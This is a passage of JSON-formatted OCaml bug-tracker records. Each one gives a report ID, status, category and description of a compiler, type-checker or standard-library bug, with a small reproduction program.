Failure(\"int_of_string\")\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7532\n**Reporter:** Matthieu Lemerre\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-05-11T17:56:39Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** major\n**Platform:** Linux\n**OS:** Debian\n**Version:** 4.04.0\n**Category:** typing\n**Duplicate of:** #7364\n**Monitored by:** @yallop\n\n## Bug description\n\nThe compiler fails at detecting that a type cannot contain a float value on a recursive type definition, and fails with the following error:\r\n\r\nError: This type cannot be unboxed because\r\n       it might contain both float and non-float values.\r\n       You should annotate it with [@@ocaml.boxed].\r\n\r\nIf the type definition is not recursive, the type is correctly detected as unboxable.\n\n## Steps to reproduce\n\nocamlc on the following program. Reports an error with opam switch 4.04.0+fp and latest trunk (908a38182752f4052289f6616)\r\n\r\ntype x\r\ntype y\r\n\r\ntype 'a t =\r\n  | X: {id: int} -> x t\r\n  | Y: {id: int} -> y t\r\n\r\nand any = Any: 'a t -> any [@@unboxed]\n\n## Additional information\n\nWith the following program, everything works as intended; the only difference is that the type definition is not recursive:\r\n\r\ntype x\r\ntype y\r\n\r\ntype 'a t =\r\n  | X: {id: int} -> x t\r\n  | Y: {id: int} -> y t\r\n\r\ntype any = Any: 'a t -> any [@@unboxed]\r\n\r\nOf course I actually need a recursive version, where X contains an \"any\" field.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7531\n**Reporter:** jmi\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2017-05-08T11:17:10Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Category:** middle end (typedtree to clambda)\n**Related to:** #7533\n\n## Bug description\n\nThe native code compiler erroneously delays the effect of an operator until (if ever) it is fully applied.\r\n\r\nThe following program outputs a newline when compiled with the bytecode compiler but not with the native code compiler:\r\n\r\n    (let _i = print_newline ()                                                                                    \r\n     in fun q -> fun i -> \"\") ()\r\n\r\nI believe the issue is described by the following comment on line 828 of asmcomp/closure.ml:\r\n\r\n(* We convert [f a] to [let a' = a in fun b c -> f a' b c]\r\n       when fun_arity > nargs *)\r\n\r\nwhich instead should use an approach along the lines of:\r\n\r\n(* We convert [f a] to [let fâ = f in\r\n                        let aâ = a in fun b c -> fâ aâ b c]\r\n       when fun_arity > nargs *)\r\n\r\n\r\nThe above example illustrates the situation when the effect is delayed indefinitely. For an example, where the effect is delayed until the time of full application, consider:\r\n\r\n    let k =                                                                                                       \r\n      (let _i = print_int 1                                                                                       \r\n       in fun q -> fun i -> \"\") ()                                                                                \r\n    in k (print_int 0)\r\n\r\nwhich prints 10 when compiled with the bytecode backend and 01 with the native code backend.\r\n\r\n\r\nThe behaviour is the same for version 4.02.3.\n\n## Steps to reproduce\n\n$ ocamlc -o func.byte func.ml\r\n$ ./func.byte\r\n\r\n$ ocamlopt -o func.native func.ml\r\n$ ./func.native \r\n$\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7530\n**Reporter:** igo_weiqi_baduk\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @Octachron on 2017-10-01T08:42:57Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.04.1\n**Category:** documentation\n\n## Bug description\n\nWill the documentation for the OCaml 4.04.1 Release be provided \r\n(as for the 4.02.1 for example) ?\r\n\r\nOr do we have to wait for the 4.05 Release ?\n"},{"labels":["bug"],"text":"**Original bug ID:** 7528\n**Reporter:** mars0i\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-12-04T16:07:02Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** ocaml\n**OS:** OS X\n**OS Version:** 10.11.6\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** misc\n\n## Bug description\n\nThis is an issue observed in the ocaml toplevel.  It can be demonstrated in utop as well.  (This is my first time using Mantis.  I'm not sure whether I entered all of the information correctly.)\r\n\r\nWhen the display margin in a toplevel is set to > 80 columns, lists with simple elements will display using a margin greater than 80, but lists containing lists or tuples will wrap at or near 80 columns even when set_margin_function is used to specify a larger margin. If a margin smaller than 80 is set with set_margin_function, both simple lists and those with more complex elements wrap at the chosen margin.  When the margin is subsequently set to a larger value, the complex lists continue to wrap at the narrower margin.\n\n## Steps to reproduce\n\nThe following was run in the OCaml toplevel, version 4.04.0 on OS X 10.11.6.  To see the effect in utop, replace \"Format.pp_set_margin Format.std_formatter <integer>\" with \"UTop.set_margin_function (fun _ -> Some <integer>)\"\r\n\r\n<pre>\r\n# Format.pp_set_margin Format.std_formatter 120;;\r\n- : unit = ()\r\n# let l = Batteries.List.range 0 `To 100;;\r\nval l : int list =\r\n  [0; 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18; 19; 20; 21; 22; 23; 24; 25; 26; 27; 28; 29; 30;\r\n   31; 32; 33; 34; 35; 36; 37; 38; 39; 40; 41; 42; 43; 44; 45; 46; 47; 48; 49; 50; 51; 52; 53; 54; 55; 56; 57; 58; 59;\r\n   60; 61; 62; 63; 64; 65; 66; 67; 68; 69; 70; 71; 72; 73; 74; 75; 76; 77; 78; 79; 80; 81; 82; 83; 84; 85; 86; 87; 88;\r\n   89; 90; 91; 92; 93; 94; 95; 96; 97; 98; 99; 100]\r\n# let ll = Batteries.List.map (fun x -> [x]) l;;\r\nval ll : int list list =\r\n  [[0]; [1]; [2]; [3]; [4]; [5]; [6]; [7]; [8]; [9]; [10]; [11]; [12];\r\n   [13]; [14]; [15]; [16]; [17]; [18]; [19]; [20]; [21]; [22]; [23];\r\n   [24]; [25]; [26]; [27]; [28]; [29]; [30]; [31]; [32]; [33]; [34];\r\n   [35]; [36]; [37]; [38]; [39]; [40]; [41]; [42]; [43]; [44]; [45];\r\n   [46]; [47]; [48]; [49]; [50]; [51]; [52]; [53]; [54]; [55]; [56];\r\n   [57]; [58]; [59]; [60]; [61]; [62]; [63]; [64]; [65]; [66]; [67];\r\n   [68]; [69]; [70]; [71]; [72]; [73]; [74]; [75]; [76]; [77]; [78];\r\n   [79]; [80]; [81]; [82]; [83]; [84]; [85]; [86]; [87]; [88]; [89];\r\n   [90]; [91]; [92]; [93]; [94]; [95]; [96]; [97]; [98]; [99]; [100]]\r\n# Format.pp_set_margin Format.std_formatter 40;;\r\n- : unit = ()\r\n# l;;\r\n- : int list =\r\n[0; 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11;\r\n 12; 13; 14; 15; 16; 17; 18; 19; 20;\r\n 21; 22; 23; 24; 25; 26; 27; 28; 29;\r\n 30; 31; 32; 33; 34; 35; 36; 37; 38;\r\n 39; 40; 41; 42; 43; 44; 45; 46; 47;\r\n 48; 49; 50; 51; 52; 53; 54; 55; 56;\r\n 57; 58; 59; 60; 61; 62; 63; 64; 65;\r\n 66; 67; 68; 69; 70; 71; 72; 73; 74;\r\n 75; 76; 77; 78; 79; 80; 81; 82; 83;\r\n 84; 85; 86; 87; 88; 89; 90; 91; 92;\r\n 93; 94; 95; 96; 97; 98; 99; 100]\r\n# ll;;\r\n- : int list list =\r\n[[0]; [1]; [2]; [3];\r\n [4]; [5]; [6]; [7];\r\n [8]; [9]; [10]; [11];\r\n [12]; [13]; [14]; [15];\r\n [16]; [17]; [18]; [19];\r\n [20]; [21]; [22]; [23];\r\n [24]; [25]; [26]; [27];\r\n [28]; [29]; [30]; [31];\r\n [32]; [33]; [34]; [35];\r\n [36]; [37]; [38]; [39];\r\n [40]; [41]; [42]; [43];\r\n [44]; [45]; [46]; [47];\r\n [48]; [49]; [50]; [51];\r\n [52]; [53]; [54]; [55];\r\n [56]; [57]; [58]; [59];\r\n [60]; [61]; [62]; [63];\r\n [64]; [65]; [66]; [67];\r\n [68]; [69]; [70]; [71];\r\n [72]; [73]; [74]; [75];\r\n [76]; [77]; [78]; [79];\r\n [80]; [81]; [82]; [83];\r\n [84]; [85]; [86]; [87];\r\n [88]; [89]; [90]; [91];\r\n [92]; [93]; [94]; [95];\r\n [96]; [97]; [98]; [99];\r\n [100]]\r\n# Format.pp_set_margin Format.std_formatter 120;;\r\n- : unit = ()\r\n# l;;\r\n- : int list =\r\n[0; 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18; 19; 20; 21; 22; 23; 24; 25; 26; 27; 28; 29; 30; 31;\r\n 32; 33; 34; 35; 36; 37; 38; 39; 40; 41; 42; 43; 44; 45; 46; 47; 48; 49; 50; 51; 52; 53; 54; 55; 56; 57; 58; 59; 60;\r\n 61; 62; 63; 64; 65; 66; 67; 68; 69; 70; 71; 72; 73; 74; 75; 76; 77; 78; 79; 80; 81; 82; 83; 84; 85; 86; 87; 88; 89;\r\n 90; 91; 92; 93; 94; 95; 96; 97; 98; 99; 100]\r\n# ll;;\r\n- : int list list =\r\n[[0]; [1]; [2]; [3];\r\n [4]; [5]; [6]; [7];\r\n [8]; [9]; [10]; [11];\r\n [12]; [13]; [14]; [15];\r\n [16]; [17]; [18]; [19];\r\n [20]; [21]; [22]; [23];\r\n [24]; [25]; [26]; [27];\r\n [28]; [29]; [30]; [31];\r\n [32]; [33]; [34]; [35];\r\n [36]; [37]; [38]; [39];\r\n [40]; [41]; [42]; [43];\r\n [44]; [45]; [46]; [47];\r\n [48]; [49]; [50]; [51];\r\n [52]; [53]; [54]; [55];\r\n [56]; [57]; [58]; [59];\r\n [60]; [61]; [62]; [63];\r\n [64]; [65]; [66]; [67];\r\n [68]; [69]; [70]; [71];\r\n [72]; [73]; [74]; [75];\r\n [76]; [77]; [78]; [79];\r\n [80]; [81]; [82]; [83];\r\n [84]; [85]; [86]; [87];\r\n [88]; [89]; [90]; [91];\r\n [92]; [93]; [94]; [95];\r\n [96]; [97]; [98]; [99];\r\n [100]]\r\n</pre>\n\n## Additional information\n\nI originally reported this as an issue in utop (https://github.com/diml/utop/issues/208), but it was suggested there that it was a bug in the OCaml pretty printer.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7527\r\n**Reporter:** domsj\r\n**Assigned to:** @mshinwell\r\n**Status:** assigned (set by @mshinwell on 2017-05-04T15:37:10Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.03.0\r\n**Category:** standard library\r\n\r\n## Bug description\r\n\r\n```ocaml\r\nlet () =\r\n  let print_stack_size () =\r\n    let open Gc in\r\n    Printf.printf \"stack_size=%i\\n\" (quick_stat ()).stack_size;\r\n  in\r\n  print_stack_size ();\r\n  Thread.create print_stack_size () |> Thread.join\r\n```\r\n\r\nthis snippet prints:\r\n```\r\nstack_size=26\r\nstack_size=1035826253803286485\r\n```"},{"labels":["bug",null],"text":"**Original bug ID:** 7525\n**Reporter:** domsj\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-05-05T14:19:50Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** language features\n\n## Bug description\n\nexample code:\r\n\r\nlet () =\r\n  let x f g =\r\n    f ();\r\n    g ();\r\n    f ();\r\n    ()\r\n  in\r\n  let rec inner () =\r\n    (inner [@tailcall]) (); (* compiler warns about this *)\r\n    x\r\n      (fun () -> ())\r\n      (fun () -> if false then (inner [@tailcall]) ()) (* but wrongly thinks this code is ok? *)\r\n  in\r\n  inner ()\r\n\r\n==============\r\n\r\nEncountered this problem when doing a recursive call in an exception handler (e.g. with Lwt.catch)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7524\n**Reporter:** modlfo\n**Status:** acknowledged (set by @dra27 on 2017-05-02T10:08:27Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** typing\n**Related to:** #3921 #7502\n\n## Bug description\n\nThis is a proposal/request for creating a warning that will be trigger when using '=' on any value that is not immediate (like lists, records).\r\n\r\nThe main motivation is to avoid problems as the ones described in the reports 0003921, 0007502.\r\n\r\nWe were also affected in our product by this behavior. The problem that we had was that an algorithm using 'compare a b = 0' was changed to 'a = b'. This produced a big performance degradation since we were not aware that '=' didn't performed physical comparison.\r\n\r\nWhen enabling this warning new programmers will be notified of this behavior therefore avoiding the unintended consequence.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7523\n**Reporter:** @c-cube\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-04-26T08:36:08Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** all\n**OS:** all\n**Version:** 4.03.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** standard library\n**Has duplicate:** #7578\n\n## Bug description\n\nWhen a program written using Arg is not supplied well-formed options on the command line, an error message is displayed. However, in a particular case, the error message is output 3 times, not only one. This case seems to arise when the last parameter is an -option that has a mandatory argument.\r\nThe bug can be reproduced from 4.03 up to 4.04.1 and was initially reported by  Florian Pichlmeier.\n\n## Steps to reproduce\n\n# foo.ml\r\nlet () =\r\n  Arg.parse [\r\n    \"--option\", Arg.String (fun _ -> ()), \" option <string>\";\r\n    ] (fun _ -> ()) \"some help msg\"\r\n\r\n\r\nThen,\r\n\r\n$ ocaml foo.ml --option   \r\nfoo.ml: option '--option' needs an argument.\r\nsome help msg\r\n  --option  option <string>\r\n  -help  Display this list of options\r\n  --help  Display this list of options\r\nfoo.ml: foo.ml: option '--option' needs an argument.\r\nsome help msg\r\n  --option  option <string>\r\n  -help  Display this list of options\r\n  --help  Display this list of options\r\n.\r\nsome help msg\r\n  --option  option <string>\r\n  -help  Display this list of options\r\n  --help  Display this list of options\r\n\r\n\r\nwhereas this works as expected:\r\n\r\n$ ocaml foo.ml -bad-option\r\nfoo.ml: unknown option '-bad-option'.\r\nsome help msg\r\n  --option  option <string>\r\n  -help  Display this list of options\r\n  --help  Display this list of options\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7522\r\n**Reporter:** @SkySkimmer\r\n**Status:** acknowledged (set by @dra27 on 2017-04-27T19:43:56Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** tweak\r\n**Version:** 4.04.1\r\n**Category:** misc\r\n**Child of:** #7314\r\n**Monitored by:** @Yakobowski\r\n\r\n## Bug description\r\n\r\nThis is mentioned at the end of #7314 by @eponier whose reproduction is smaller than mine.\r\n\r\n## Steps to reproduce\r\n\r\nmodule M : sig module A : sig type t end end =\r\nstruct\r\n  module rec A : sig type t end = struct type t = B.t end\r\n  and B : sig type t end = struct type t = A.t list end\r\nend\r\n\r\nWith 4.04.1, \"ocamlc -w A\" returns \"Warning 60 : unused module B\".\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7521\n**Reporter:** schommer\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-05-04T12:39:58Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** amd64\n**OS:** opensuse\n**OS Version:** 42.2\n**Version:** 4.04.1\n**Category:** ocamldoc\n**Monitored by:** @gasche\n\n## Bug description\n\nThe reference tests:\r\ntests/tool-ocamldoc-2/inline_records.mli\r\ntests/tool-ocamldoc-2/inline_records_bis.ml\r\n\r\nfail with the following diffs:\r\n--- tests/tool-ocamldoc-2/inline_records_bis.result\t2017-04-25 16:26:07.413129690 +0200\r\n+++ tests/tool-ocamldoc-2/inline_records_bis.reference\t2017-04-25 15:25:40.209075702 +0200\r\n@@ -283,4 +283,4 @@\r\n \r\n Two new constructors for ext\r\n \r\n-\\end{document}\r\n\\ No newline at end of file\r\n+\\end{document}\r\n\r\nand\r\n\r\n--- tests/tool-ocamldoc-2/inline_records.result\t2017-04-25 16:26:07.333132267 +0200\r\n+++ tests/tool-ocamldoc-2/inline_records.reference\t2017-04-25 15:25:40.209075702 +0200\r\n@@ -284,4 +284,4 @@\r\n \\end{ocamldocdescription}\r\n \r\n \r\n-\\end{document}\r\n\\ No newline at end of file\r\n+\\end{document}\r\n\r\nThese tests worked with 4.04.\n\n## Steps to reproduce\n\nconfigure ocaml with -cc clang and execute make world.opt; make tests\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7520\r\n**Reporter:** @lpw25\r\n**Status:** acknowledged (set by @xavierleroy on 2017-09-30T09:08:45Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.04.0\r\n**Target version:** later\r\n**Category:** typing\r\n**Monitored by:** @gasche @yallop\r\n\r\n## Bug description\r\n\r\nRefutation cases have some odd behaviour with polymorphic variants. Given an uninhabited type:\r\n```ocaml\r\ntype ('a, 'b) eq = Refl : ('a, 'a) eq\r\ntype empty = (int, string) eq\r\n```\r\nThe following fails:\r\n```\r\n  # let f = function `Foo (_ : empty) -> .;;\r\n  Characters 17-33:\r\n    let f = function `Foo (_ : empty) -> .;;\r\n                     ^^^^^^^^^^^^^^^^\r\n  Error: This match case could not be refuted.\r\n         Here is an example of a value that would reach it: `Foo _\r\n```\r\nIt continues to fail if the variant type is constrained:\r\n```\r\n  # let f : [< `Foo of empty] -> int = function `Foo (_ : empty) -> .;;\r\n  Characters 44-60:\r\n    let f : [< `Foo of empty] -> int = function `Foo (_ : empty) -> .;;\r\n                                                ^^^^^^^^^^^^^^^^\r\n  Error: This match case could not be refuted.\r\n         Here is an example of a value that would reach it: `Foo _\r\n```\r\nBut it works of the type is fixed:\r\n```\r\n  # let f : [`Foo of empty] -> int = function `Foo (_ : empty) -> .;;\r\n  val f : [ `Foo of empty ] -> int = <fun>\r\n```\r\nOr if we add a second empty refutation case:\r\n```\r\n  # let f : [< `Foo of empty] -> int = function `Foo _ -> . | _ -> .;;\r\n  val f : [ `Foo of empty ] -> int = <fun>\r\n```"},{"labels":["bug",null],"text":"**Original bug ID:** 7519\n**Reporter:** @mmottl\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-08-29T07:34:22Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Monitored by:** @gasche @yallop @mmottl\n\n## Bug description\n\nThe following program is rejected by the compiler:\r\n\r\n-----\r\nmodule Gen_spec = struct type 't extra = unit end\r\n\r\nmodule type S = sig\r\n  module Spec : sig type 't extra = unit end\r\n\r\n  type t\r\n  val make : unit -> t Spec.extra\r\nend  (* S *)\r\n\r\nmodule Make () : S with module Spec := Gen_spec = struct\r\n  type t = int\r\n  let make () = ()\r\nend  (* Make *)\r\n\r\nlet () =\r\n  let module M = Make () in\r\n  M.make ()\r\n  (* (M.make () : unit) *)\r\n-----\r\n\r\nThe error is:\r\n\r\n-----\r\nFile \"./foo.ml\", line 17, characters 2-11:\r\nError: This expression has type M.t Gen_spec.extra = unit\r\n       but an expression was expected of type unit\r\n       The type constructor M.t would escape its scope\r\n-----\r\n\r\nThe error shows that the compiler already knows that M.t Gen_spec.extra is equivalent to the unit type.  Therefore, there should not be any type escaping the scope of the local module.  Using the commented out last line instead of the preceding one also shows that the compiler will happily unify the type with \"unit\" and then accept the program.\r\n\r\nI suppose that there is a missing conversion somewhere in the type checker that should attempt to eliminate all local types before complaining about scope violations.\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7518\n**Reporter:** @dra27\n**Assigned to:** @dra27\n**Status:** assigned (set by @dra27 on 2017-04-19T09:17:18Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** otherlibs\n**Has duplicate:** #7906\n**Related to:** #7517\n\n## Bug description\n\nAbsolute symbolic links on Windows include the NT Object Manager DOS Device namespace prefix (\"\\??\\\") - this should not be being returned.\n\n## Steps to reproduce\n\n# Unix.symlink \"C:\\\\Windows\" \"C:\\\\Windows-Link\";;\r\n- : unit = ()\r\n# Unix.readlink \"C:\\\\Windows-Link\";;\r\n- : string = \"\\\\??\\\\C:\\\\Windows\"\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7516\n**Reporter:** @whitequark\n**Assigned to:** @dra27\n**Status:** closed (set by @dra27 on 2017-04-16T08:46:43Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**Version:** 4.04.0\n**Fixed in version:** 4.04.1\n**Category:** compiler driver\n\n## Bug description\n\nIt seems that some symbols are not exported properly from ocamlopt. This bug is actually extremely weird, because on my opam install (as is usual) both ocamlc and ocamlopt are native-code, but it works with ocamlc.\r\n\r\n$ file `which ocamlc`\r\n~/.opam/4.04.0+32bit/bin/ocamlc: symbolic link to ocamlc.opt\r\n$ file `which ocamlopt`\r\n~/.opam/4.04.0+32bit/bin/ocamlopt: symbolic link to ocamlopt.opt\n\n## Steps to reproduce\n\n$ cat >t.ml\r\nlet () =\r\n  let x = [|0;1;2|] in (* allocate something *)\r\n  for i = 0 to 2 do print_int x.(i) done\r\n$ ocamlbuild t.cmxs\r\n$ ocamlopt -plugin _build/t.cmxs\r\nFile \"_none_\", line 1:\r\nError: error loading shared library: _build/t.cmxs: undefined symbol: caml_alloc3 while loading argument of -plugin\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7515\n**Reporter:** @nojb\n**Status:** closed (set by @alainfrisch on 2017-06-30T08:31:24Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** standard library\n\n## Bug description\n\nThe Arg.align function allows to correctly align docstrings of the form\r\n\r\n  -foo FOO      My docstring for foo\r\n  -bar BAR      My docstring for bar\r\n\r\nby using the docstring \"FOO My docstring for foo\" in the first case and \"BAR My docstring for bar\" in the second case.\r\n\r\nUnfortunately this does not allow to document Tuple arguments which have more than argument component, e.g.\r\n\r\n  -tuple FOO BAR    My docstring for foo\r\n\r\nIn other words, it would be nice to be able to somehow include spaces in the \"first word\" of the docstring.\r\n\r\nI am not sure what a good solution would be that would not break backwards compatibilty.\r\n\r\nMaybe we could declare a not-very-common character to be rendered as a space when found in the \"first word\" of the docstring.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7513\n**Reporter:** @yallop\n**Assigned to:** @lefessan\n**Status:** resolved (set by @mshinwell on 2017-05-16T20:00:26Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** standard library\n\n## Bug description\n\n# List.compare_length_with [] min_int;;\r\n- : int = 1\r\n# List.compare_length_with [1] min_int;;\r\n- : int = -1\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7512\n**Reporter:** reuben.rowe\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-03-29T18:30:28Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** Ubuntu\n**OS Version:** 16.04\n**Version:** 4.04.0\n**Category:** lexing and parsing\n\n## Bug description\n\nAccording to the language specification\r\n\r\n    https://caml.inria.fr/pub/docs/manual-ocaml/expr.html\r\n\r\nI should be able to write something like the following:\r\n\r\n    # let v = lazy let s = \"hello\" in s ^ \"world\" ;;\r\n\r\nHowever this is reported as a syntax error by the compiler.\r\n\r\nOn the other hand, the following is fine:\r\n\r\n    # let v = lazy (let s = \"hello\" in s ^ \"world\") ;;\r\n\r\nIs this a bug, or have I missed something?\n\n## Steps to reproduce\n\nEnter the following in an interactive session:\r\n\r\nlet v = lazy let s = \"hello\" in s ^ \"world\" ;;\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7511\n**Reporter:** @yallop\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @damiendoligez on 2017-06-22T09:23:47Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n\n## Bug description\n\n$ cat ub.ml\r\n  type _ s = S : 'a  -> 'a s [@@unboxed]\r\n  type   t = T : _ s ->    t [@@unboxed]\r\n  let _ = [| T (S 0.0); T (S 0) |]\r\n\r\n  $ ocaml ub.ml\r\n  Segmentation fault\n"},{"labels":["bug"],"text":"**Original bug ID:** 7510\n**Reporter:** LucFreget\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-03-25T17:45:13Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** trivial\n**Platform:** Mac\n**OS:** MacOS\n**OS Version:** Sierra 10.12.3\n**Version:** 4.04.0\n**Category:** misc\n\n## Bug description\n\nDans une fonction (en l'occurrence, une fonction rÃ©cursive), l'expression [h1]@l2@[h2] n'est pas Ã©valuÃ©e de la mÃªme faÃ§on que (xxx h1 h2 l2) quand xxx est dÃ©finie comme suit:\r\n\r\nlet xxx a b l = [a]@l@[b];;\n\n## Steps to reproduce\n\n#let la = [0; 0; 0; 0];;\r\n#let lb = [1; 2; 3; 4];;\r\n\r\n#let print_list l = List.map (fun item -> print_int item) l;;\r\n#print_list la;;\r\n0000\r\n#print_list lb;;\r\n1234\r\n\r\n# let xxx a b l = [a]@l@[b];;\r\n# let rec fusion l1 l2 =\r\n  begin print_list l1; print_string \" \"; print_list l2; print_string \"\\n\";\r\n  match l1 with | [] -> l2 | [h] -> [h]@l2 | h1::h2::t -> fusion t (xxx h1 h2 l2); end;;\r\n\r\n# fusion lb la;;\r\n1234 0000\r\n34 100002\r\n 31000024\r\n- : int list = [3; 1; 0; 0; 0; 0; 2; 4]\r\n#\r\n\r\nJUSQU'ICI, TOUT VA BIEN\r\n\r\n# let rec fusion2 l1 l2 =\r\n  begin print_list l1; print_string \" \"; print_list l2; print_string \"\\n\";\r\n  match l1 with | [] -> l2 | [h] -> [h]@l2 | h1::h2::t -> fusion2 t [h1]@l2@[h2]; end;;\r\n# fusion2 lb la;;\r\n1234 0000\r\n34 1\r\n 314\r\n- : int list = [3; 1; 4; 0; 0; 0; 0; 2]\r\n# \r\n \r\nLa valeur retournÃ©e par la fonction fusion2 est diffÃ©rente de celle retournÃ©e par fusion, alors que la seule diffÃ©rence entre les deux fonctions est le remplacement de (xxx h1 h2 l2) par [h1]@l2@[h2].\r\n\r\nLorsque fusion2 est appelÃ©e rÃ©cursivement, son deuxiÃ¨me argument vaut [1], quand on s'attend Ã  [1; 0; 0; 0; 0; 2].\n\n## Additional information\n\nAutre bizarrerie: dans l'exemple suivant, une arobase a Ã©tÃ© oubliÃ©e dans [h1]@l2[h2].\r\n\r\n# let rec fusion l1 l2 =\r\n  begin print_list l1; print_string \" \"; print_list l2; print_string \"\\n\";\r\n  match l1 with | [] -> l2 | [h] -> [h]@l2 | h1::h2::t -> fusion t [h1]@l2[h2]; end;;\r\nWarning 10: this expression should have type unit.\r\nWarning 10: this expression should have type unit.\r\nError: This expression has type int list\r\n       This is not a function; it cannot be applied.\r\n# fusion lb la;;\r\n1234 0000\r\n34 100002\r\n 31000024\r\n- : int list = [3; 1; 0; 0; 0; 0; 2; 4]\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7509\n**Reporter:** @kenichi-asai\n**Status:** resolved (set by @dra27 on 2017-10-12T10:50:02Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** tweak\n**Platform:** Apple\n**OS:** MacOS X\n**OS Version:** 10.12\n**Version:** 4.04.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** configure and build/install\n\n## Bug description\n\nThe following files exist in the distribution:\r\n\r\n.depend\r\n/otherlibs/systhreads/thread.ml\r\n/testsuite/tests/asmcomp/mips.s\r\n/testsuite/tests/opaque/intf/opaque_impl.mli\r\n/testsuite/tests/opaque/intf/opaque_intf.mli\r\n/testsuite/tests/opaque/intf/regular.mli\r\n\r\nbut they match the pattern in .gitignore.  As such, if one creates a fresh git repository from the distribution, they are ignored in the repository, resulting in a failure when doing \"make world\".\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7507\n**Reporter:** @Armael\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-05-08T21:18:54Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** documentation\n\n## Bug description\n\nIn stdlib/printf.mli, the documentation for the %g format states:\r\n\r\n   - [g] or [G]: convert a floating-point argument to decimal notation, in style [f] or [e], [E] (whichever is more compact).                                                                                                                                                          \r\n\r\nHowever:\r\n\r\n- [Printf.printf \"%f\" 1.] prints \"1.000000\"\r\n- [Printf.printf \"%e\" 1.] prints \"1.000000e+00\"\r\n- [Printf.printf \"%g\" 1.] prints \"1\", which corresponds to neither \"%f\" or \"%e\".\r\n\r\nThis seems to indicate that the documentation for %g is quite vague, at best.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7506\n**Reporter:** @kenichi-asai\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-04-10T16:38:12Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Platform:** Apple\n**OS:** MacOS X\n**OS Version:** 10.12\n**Version:** 4.04.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** lexing and parsing\n\n## Bug description\n\nLet a.ml be:\r\n\r\nlet a = ([1; 2])[@hello]\r\nlet b = 0::(([1; 2])[@hello])\r\n\r\n$ ocamlc -dsource a.ml\r\nlet a = (([1; 2])[@hello ])\r\nlet b = [0; 1; 2]\r\n\r\nwhere the attribute for [1; 2] in b is ignored.  The output for b should be 0::(([1; 2])[@hello 